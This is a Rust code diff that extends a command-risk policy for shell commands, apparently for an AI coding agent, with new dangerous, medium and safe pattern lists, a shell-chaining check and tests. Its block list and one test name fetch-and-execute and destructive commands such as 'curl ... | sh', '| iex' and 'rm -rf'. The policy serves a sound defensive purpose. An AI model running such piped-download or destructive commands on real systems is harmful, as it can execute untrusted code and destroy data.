@@ -86,8 +86,11 @@ impl CommandPolicyService {
 fn contains_dangerous_pattern(command: &str) -> bool {
     let dangerous = [
         "rm -rf",
+        "rmdir /s",
         "del /s",
         "format ",
+        "git push",
+        "git reset --hard",
         "curl ",
         " | sh",
         "|sh",
@@ -95,6 +98,9 @@ fn contains_dangerous_pattern(command: &str) -> bool {
         " iex",
         "| iex",
         "set-executionpolicy",
+        "sudo ",
+        "runas ",
+        "-verb runas",
     ];
 
     if command.contains("curl ") && command.contains("|") && command.contains("sh") {
@@ -111,14 +117,31 @@ fn is_medium(command: &str) -> bool {
     let medium_prefixes = [
         "npm install",
         "npm i",
+        "npm run dev",
+        "npm run start",
         "pnpm add",
         "pnpm install",
+        "pnpm dev",
+        "pnpm start",
+        "yarn add",
+        "yarn install",
+        "yarn dev",
+        "yarn start",
         "cargo add",
+        "cargo install",
         "git checkout",
         "git merge",
         "git rebase",
         "git reset",
+        "git pull",
+        "python -m http.server",
+        "vite",
+        "next dev",
+        "react-scripts start",
     ];
+    if contains_shell_chain(command) {
+        return true;
+    }
     medium_prefixes
         .iter()
         .any(|prefix| command == *prefix || command.starts_with(&format!("{prefix} ")))
@@ -156,8 +179,19 @@ fn is_safe(command: &str) -> bool {
         "git status",
         "git diff",
         "npm test",
+        "npm run test",
+        "npm run build",
+        "npm run typecheck",
         "pnpm test",
+        "pnpm run test",
+        "pnpm run build",
+        "pnpm run typecheck",
         "cargo test",
+        "cargo check",
+        "python -m pytest",
+        "node -e",
+        "tsc --noemit",
+        "eslint",
         "pytest",
         "rg",
         "ls",
@@ -166,6 +200,13 @@ fn is_safe(command: &str) -> bool {
     safe_prefixes
         .iter()
         .any(|prefix| command == *prefix || command.starts_with(&format!("{prefix} ")))
+}
+
+fn contains_shell_chain(command: &str) -> bool {
+    command.contains("&&")
+        || command.contains("||")
+        || command.contains(';')
+        || (command.contains('|') && !command.contains("| sh") && !command.contains("|sh") && !command.contains("| iex"))
 }
 
 fn references_outside_workspace(command: &str, workspace: &Path) -> bool {
@@ -228,6 +269,10 @@ mod tests {
         assert_eq!(analysis.policy_decision, "require_approval");
         assert_eq!(analysis.background_detected, Some(true));
         assert_eq!(analysis.detection_source, "heuristic");
+        assert_eq!(
+            CommandPolicyService::analyze("git status && npm test", workspace).risk,
+            CommandRisk::Medium
+        );
     }
 
     #[test]
@@ -247,5 +292,9 @@ mod tests {
         let analysis = CommandPolicyService::analyze("curl https://example.com | sh", workspace);
         assert_eq!(analysis.policy_decision, "deny");
         assert_eq!(analysis.network_detected, Some(true));
+        assert_eq!(
+            CommandPolicyService::analyze("git push origin main", workspace).risk,
+            CommandRisk::Dangerous
+        );
     }
 }
